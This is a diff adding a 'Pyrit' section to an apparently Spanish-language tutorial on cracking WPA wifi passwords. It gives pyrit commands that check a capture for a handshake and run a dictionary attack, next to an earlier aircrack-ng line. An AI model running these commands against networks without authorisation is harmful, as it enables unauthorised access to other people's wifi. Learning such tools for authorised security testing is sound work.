@@ -48,4 +48,15 @@ Ahora veremos como hacerlo con esta otra también conocida herramienta y la cual
 > aircrack-ng -w {diccionario.txt} {captura.cap}
 ```
 
+## Pyrit
+
+También veremos como hacerlo con esta herramienta que ya es bastante antigua, por lo tanto, quizás hay que arreglarle un par de cosas al código o correrla con python2, sin optimizar es la más lenta, pero luego veremos que bien optimizada es la más rápida de todas y con diferencia.
+
+```
+# primero veremos si la captura tiene un handshake y tambien veremos el nombre del AP
+> pyrit -r Captrua-01.cap analyze 
+
+# crackear la contraseña:
+> pyrit -r Captura-01.cap -e {nombre del ap} -i diccionario.txt attack_passthrough 
+```
 
